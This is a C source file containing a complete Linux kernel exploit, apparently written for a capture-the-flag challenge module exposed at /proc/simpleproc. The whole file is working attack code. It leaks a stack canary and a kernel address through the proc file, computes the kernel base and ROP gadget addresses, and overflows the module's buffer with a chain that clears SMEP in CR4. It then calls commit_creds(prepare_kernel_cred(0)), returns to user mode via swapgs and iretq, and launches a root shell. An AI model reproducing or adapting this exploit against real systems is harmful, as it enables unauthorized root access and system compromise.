#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define ul unsigned long

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

char tmp_stack[0x30000];

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
unsigned long rdi2cr4;
unsigned long poprdi;
unsigned long user_cs, user_ss, user_rflags;

/* self implement string */
typedef struct string
{
    char *data;
    unsigned int len;
} string ;

string *new_string(unsigned int sz)
{
    string *tmp =  (string*)malloc(sizeof(string));
    tmp->data = malloc(sz);
    tmp->len = 0;
    return tmp;
}

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void get_shell()
{
    if( getuid() != 0 )
    {
        puts("Get root failed!!!");
        exit(0);
    }
    printf("Enjoy your root shell :)\n");
    system("/bin/sh");
}

static void shellcode()
{
    /* in kernel mode, execute commit_creds(prepare_kernel_cred(0)); */
    commit_creds(prepare_kernel_cred(0));
    /* swapgs, store context on stack and use iret to return to user mode & call get_shell() */
    asm(
        "swapgs\n"
        "movq %0,%%rax\n"    // push things into stack for iretq
        "pushq %%rax\n"
        "movq %1,%%rax\n"
        "pushq %%rax\n"
        "movq %2,%%rax\n"
        "pushq %%rax\n"
        "movq %3,%%rax\n"
        "pushq %%rax\n"
        "movq %4,%%rax\n"
        "pushq %%rax\n"
        "iretq\n"
        :
        :"r"(user_ss),"r"(tmp_stack+0x10000),"r"(user_rflags),"r"(user_cs),"r"(get_shell)
        :"memory"
       );
       
}

ul u64(char *str)
{
    int i = 0;
    ul ret = 0;
    for(i = 7 ; i >= 0 ; i--)
    {   
        ret <<= 8;
        ret |= ((int)(str[i])&0xff);
    }
    return ret;
}

char *p64(ul data)
{
    int i = 0;
    char *p = malloc(8);
    for (i = 0; i < 8; i++) 
    {
        p[i] = (char)(data & 0xff);
        data >>= 8;
    }
    return p;
}

/* extract substring */
char *substr(char *buf, int start, int end)
{
    int i = 0;
    int index = 0;
    char *p = malloc(8);
    for(i = start ; i < end ; i++)
    {
        p[index++] = buf[i];
    }
    return p;
}

/* concat 8 byte string to payload*/
void cat8(string *payload, char *data)
{
    int i = 0;
    unsigned int index = payload->len;
    for (i = 0; i < 8; i++) 
    {
        payload->data[index++] = data[i];
    }
    payload->len += 8;
}

void ljust(string *s, unsigned int len, char c)
{
    int i = 0;
    unsigned int index = s->len;
    for (i = index; i < len; i++) 
    {
        s->data[i] = c;
    }
    s->len = len;
}   

int main(int argc, const char *argv[])
{
    char in[1000] = {};
    /* leak stack canary & kernel address */
    int rfd = open("/proc/simpleproc", O_RDONLY);
    read(rfd, in, 300);
    ul canary = u64(substr(in, 100, 108));
    ul kaddr = u64(substr(in, 148, 156));
    ul kbase = kaddr - 0x2cc2e2;
    prepare_kernel_cred = kbase + 0xaa6b0;
    commit_creds = kbase + 0xaa2e0;
    poprdi = kbase + 0x3d9d3d;
    rdi2cr4 = kbase + 0x01ead0;
    printf("canary: %p\n", canary);
    printf("kaddr: %p\n", kaddr);
    printf("kbase: %p\n", kbase);
    printf("prepare_kernel_cred: %p\n", prepare_kernel_cred);
    printf("commit_creds: %p\n", commit_creds);
    printf("poprdi: %p\n", poprdi);
    printf("rdi2cr4: %p\n", rdi2cr4);

    /* craft payload : padding + canary + padding + ropchain */
    string *payload = new_string(200);
    ljust(payload, 100, 'A');
    cat8(payload, p64(canary));
    ljust(payload, 148, 'B');
    ul rop[] = {
        poprdi,
        0x6f0,
        rdi2cr4, //  mov cr4, rdi ; pop rbp ; ret
        (ul)tmp_stack+0x10000, // for rbp
        (ul)shellcode,
    };

    /* append ropchain to payload string */
    int i = 0;
    for(i = 0 ; i < sizeof(rop)/8 ; i++)
    {
        cat8(payload, p64(rop[i]));
    }

    int wfd = open("/proc/simpleproc", O_WRONLY);
    save_state();
    write(wfd, payload->data, payload->len);
    return 0;
}
